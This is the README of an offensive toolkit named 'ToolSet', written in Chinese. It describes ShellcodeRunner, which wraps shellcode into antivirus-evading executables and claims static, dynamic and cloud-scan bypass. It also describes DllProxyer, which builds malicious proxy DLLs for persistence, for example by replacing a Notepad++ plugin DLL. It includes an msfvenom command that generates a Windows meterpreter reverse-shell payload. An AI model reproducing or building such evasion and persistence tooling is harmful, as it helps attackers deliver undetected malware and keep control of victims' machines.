# ToolSet

一个小小的工具集

## 安装

```shell
git clone $repo_url

sudo docker-compose build && sudo docker-compose up -d
```

访问 `http://127.0.0.1:8080/swagger/index.html` 即可查看接口文档


## 工具列表

### ShellcodeRunner

#### 介绍

一个shellcode包装器，可根据提供的shellcode raw[`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -f raw > ~/shell.raw`]文件
生成免杀的执行器

#### 国际惯例

![ShellcodeRunner静态bypass.webp](pics/ShellcodeRunner-static-bypassAV.webp)
![ShellcodeRunner动态bypass.webp](pics/ShellcodeRunner-dynamic-bypassAV.webp)

##### 云查杀测试

一天过去了，还能冲，应该bypass了云查杀

![一天后冲图.webp](pics/ShellcodeRunner-static-rescan-after-one-day.webp)

### DllProxyer

#### 介绍

依旧是一个shellcode包装器，但是关注点不同，此工具根据用户所提供的dll和shellcode，生成一个恶意转发dll

##### 用途和场景

一般可用在一些维权和白利用的场景上，比如目标用户使用 notepad++ 频率较高，则我们可以把 notepad++ 里面的某个插件的dll取出来做成恶意dll放入

